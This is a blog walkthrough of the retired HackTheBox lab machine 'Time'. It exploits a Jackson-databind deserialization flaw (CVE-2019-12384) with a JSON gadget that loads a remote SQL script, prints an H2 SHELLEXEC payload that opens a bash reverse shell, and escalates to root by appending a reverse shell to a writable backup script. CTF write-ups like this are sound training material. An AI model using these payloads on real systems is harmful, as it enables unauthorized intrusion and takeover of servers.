---
layout: walkthrough
title: HackTheBox - Time
date: 2021-04-04 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/time.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Ã–hlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Time --`10.10.10.214`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Time/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Time$ nmap -sC -sV 10.10.10.214
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 07:31 EST
Nmap scan report for 10.10.10.214
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.97 seconds

```
</details>

From the output shown above, we can see that the machine is a Linux machine and I added `time.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I started by navigating to the web application.


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Time/img1.png"  style="width: 80%" />
</p>


As shown above, it seemed to be a type of JSON validator. Going through the source code, I came across `Main.js`: 

<details>

```json

(function ($) {
    "use strict";


    /*==================================================================
    [ Validate ]*/
    var input = $('.validate-input .input100');

    $('.validate-form').on('submit',function(){
        var check = true;

        for(var i=0; i<input.length; i++) {
            if(validate(input[i]) == false){
                showValidate(input[i]);
                check=false;
            }
        }

        return check;
    });


    $('.validate-form .input100').each(function(){
        $(this).focus(function(){
           hideValidate(this);
        });
    });

    function validate (input) {
        if($(input).attr('type') == 'email' || $(input).attr('name') == 'email') {
            if($(input).val().trim().match(/^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{1,5}|[0-9]{1,3})(\]?)$/) == null) {
                return false;
            }
        }
        else {
            if($(input).val().trim() == ''){
                return false;
            }
        }
    }

    function showValidate(input) {
        var thisAlert = $(input).parent();

        $(thisAlert).addClass('alert-validate');
    }

    function hideValidate(input) {
        var thisAlert = $(input).parent();

        $(thisAlert).removeClass('alert-validate');
    }
    
    

})(jQuery);

```

</details>

The code didn't provide any hints as to what a potential issue might be, so I decided to intercept the web application requests with Burpsuite. Sending an initial request with a simple text field contained the following body:

```text
POST / HTTP/1.1
Host: 10.10.10.214
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.214/

Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Connection: close
Upgrade-Insecure-Requests: 1

mode=1&data=test%0D%0A

```

In the request shown above, `mode = 1` referred to the Beautify option while `mode = 2` referred to the Validate (Beta!) option. Since the Validate version was labelled as Beta, I decided to focus my efforts on exploiting that. As an initial test, I used the string `test` and it produced the following error:

```java
Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN.
```

Having a look for any exploits which mention `fasterxml.jackson`, I came across the following Deserialization vulnerability: <https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-467015>.

> com.fasterxml.jackson.core:jackson-databind is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. Affected versions of this package are vulnerable to Deserialization  of Untrusted Data. A Polymorphic Typing issue was discovered as com.zaxxer.hikari.HikariConfig was not blocked. Note: This is a different vulnerability than CVE-2019-16335.

It didn't seem as if there were any publically available PoCs for the above CVE, so I kept searching for similar vulnerabilities. This lead me to: <https://nsfocusglobal.com/jackson-databind-remote-code-execution-vulnerability-cve-2019-12384-threat-alert/>

> Recently, a security researcher discovered a vulnerability (CVE-2019-12384) in jackson-databind, noting that when certain conditions are met, an attacker, via a malicious request, could bypass the blacklist restriction and remotely execute code in an affected server during deserialization.

In order to exploit this vulnerability, I needed to send the following JSON query to the web application:

```json
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.48:8000/inject.sql'"}]
```

The code seemed to call a script from the attackers local machine through the use of JDBC which is a Java Database connection. There was a publically available exploit for the SQL function on Github: <https://github.com/jas502n/CVE-2019-12384>. I copied the code and inserted it into an `inject.sql` file. The function is shown below:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('id > exploited.txt')
```

A full breakdown of the code as well as a blogpost on how this vulnerability was found is on the Doyensec blog: <https://blog.doyensec.com/2019/07/22/jackson-gadgets.html>. As shown above, the `SHELLEXEC` function simply output a value to a text file. In order to exploit this vulnerability, I decided to change the `SHELLEXEC` command to a reverse shell command that would provide me with a foothold on the host.

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new 
    java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : ""; }
$$;
CALL SHELLEXEC('setsid bash -i &>/dev/tcp/10.10.14.48/1234 0>&1 &')
```

After executing the command, it pulled the code from my Kali machine and from executed the code as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Time/img2.png"  style="width: 80%" />
</p>

## Privilege Escalation using Pericles

Success! Now that I had a foothold on the machine, I performed some basic enumeration, the output of which is shown below:
<details>

```bat
uname -a:
Linux time 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
time
 
id
uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
 
ifconfig:
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.214  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:9b94  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:9b94  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:9b:94  txqueuelen 1000  (Ethernet)
        RX packets 8057  bytes 1096321 (1.0 MB)
        RX errors 0  dropped 351  overruns 0  frame 0
        TX packets 5277  bytes 6778674 (6.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 58741  bytes 4179008 (4.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 58741  bytes 4179008 (4.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 
groups:
pericles

```

</details>

In addition, I started with performing basic Linux enumeration through the use of `linpeas.sh`. While looking through the output, the following file stood out as an uncommon file: `/usr/bin/timer_backup.sh`. Since the machine was called `Time`, I decided to look into the file.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Time/img3.png"  style="width: 80%" />
</p>

The file itself was owned by the `pericles` user, so I opened the file to view the contents:

```bat
pericles@time:/home/pericles$ cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip

```
Looking at the commands above, it seems as if it's performing a similar function to a tarball which I've exploited before. Since I knew that my current user could write to the file, I needed to determine what the service did. Going back to the `linpeas` output, there were several backup files:

```text
[+] Backup files?                                                                                                 
-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old                                         
-rw-r--r-- 1 root root 214 Oct 23 06:46 /etc/systemd/system/timer_backup.timer                                    
-rw-r--r-- 1 root root 159 Oct 23 05:59 /etc/systemd/system/timer_backup.service                                  
-rw-r--r-- 1 root root 106 Oct 23 04:57 /etc/systemd/system/web_backup.service  
```

Looking into the `timer_backup.service`, it showed that it relied on the `web_backup.service`:

```text
pericles@time:/home/pericles$ cat /etc/systemd/system/timer_backup.service  
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
```

The `web_backup.service` itself simply ran the following script:

```text
pericles@time:/home/pericles$ cat /etc/systemd/system/web_backup.service  
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
```

### Exploiting timer_backup.sh

Since I knew that I was able to exploit the file and that it would transfer the contents of `/var/www/html` into the `/root` directory, I started looking into methods to exploit this. The simplest method that I could think of was simply overwriting the file and calling a bash reverse shell which I did using the following command:

```bat
echo "bash -i >& /dev/tcp/10.10.14.48/4444 0>&1"  >> /usr/bin/timer_backup.sh
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Time/img4.png"  style="width: 80%" />
</p>

Another method would have been to insert my SSH key into the root directory, however I found the above method to be a bit simpler. That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.